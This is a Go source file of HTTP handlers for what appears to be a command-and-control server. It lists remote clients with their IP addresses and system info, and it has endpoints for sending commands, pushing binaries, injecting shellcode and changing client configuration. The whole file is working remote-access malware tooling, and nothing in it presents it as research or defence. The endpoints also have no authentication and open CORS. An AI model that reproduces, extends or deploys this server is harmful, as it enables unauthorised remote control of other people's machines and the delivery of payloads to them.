package handlers

import (
	"backend/models"
	"backend/network"
	"backend/utils"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

func getClientMessagesHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	client, exists := network.GetClient(clientID)
	if !exists {
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Client not found",
		})
		return
	}

	// Return client info + messages
	response := map[string]interface{}{
		"client": map[string]interface{}{
			"id":          client.ID,
			"ip_address":  client.IPAddress,
			"last_seen":   client.LastSeen,
			"system_info": client.SystemInfo,
		},
		"messages": client.Messages,
	}

	json.NewEncoder(w).Encode(response)
}

func sendCommandHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)
	if r.Method == "OPTIONS" {
		return
	}

	var cmdReq models.CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	if err := network.SendCommandToClient(cmdReq.Client, cmdReq.Command); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send command: " + err.Error(),
		})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"status": "✅ Command sent to " + cmdReq.Client,
	})
}

func sendBinaryHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)
	if r.Method == "OPTIONS" {
		return
	}

	if err := r.ParseMultipartForm(32 << 20); err != nil { // 32MB max
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}

	clientAddr := r.FormValue("client")
	file, _, err := r.FormFile("binaryFile")
	if err != nil {
		http.Error(w, "Failed to get file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	binaryData, err := io.ReadAll(file)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to read binary file: " + err.Error(),
		})
		return
	}

	if err := network.SendFileToClient(clientAddr, binaryData); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send file: " + err.Error(),
		})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"status": fmt.Sprintf("✅ File sent (%d bytes) to %s", len(binaryData), clientAddr),
	})
}

func sendShellcodeHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)
	if r.Method == "OPTIONS" {
		return
	}

	if err := r.ParseMultipartForm(32 << 20); err != nil {
		http.Error(w, "Failed to parse form", http.StatusBadRequest)
		return
	}

	clientAddr := r.FormValue("client")
	file, _, err := r.FormFile("shellcodeFile")
	if err != nil {
		http.Error(w, "Failed to get shellcode file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	shellcodeData, err := io.ReadAll(file)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to read shellcode: " + err.Error(),
		})
		return
	}

	if err := network.SendShellcodeToClient(clientAddr, shellcodeData); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to send shellcode: " + err.Error(),
		})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"status": fmt.Sprintf("✅ Shellcode sent (%d bytes) to %s", len(shellcodeData), clientAddr),
	})
}

func updateConfigHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)
	if r.Method == "OPTIONS" {
		return
	}

	var configReq models.ConfigRequest
	if err := json.NewDecoder(r.Body).Decode(&configReq); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	if err := network.UpdateClientConfig(configReq.Client, configReq.Config); err != nil {
		json.NewEncoder(w).Encode(map[string]string{
			"status": "❌ Failed to update config: " + err.Error(),
		})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{
		"status": "✅ Configuration updated for " + configReq.Client,
	})
}

func getClientInfoHandler(w http.ResponseWriter, r *http.Request) {
	utils.EnableCORS(&w, r)

	clientID := r.URL.Query().Get("client")
	if clientID == "" {
		http.Error(w, "Client ID required", http.StatusBadRequest)
		return
	}

	client, exists := network.GetClient(clientID)
	if !exists {
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Client not found",
		})
		return
	}

	json.NewEncoder(w).Encode(client.SystemInfo)
}
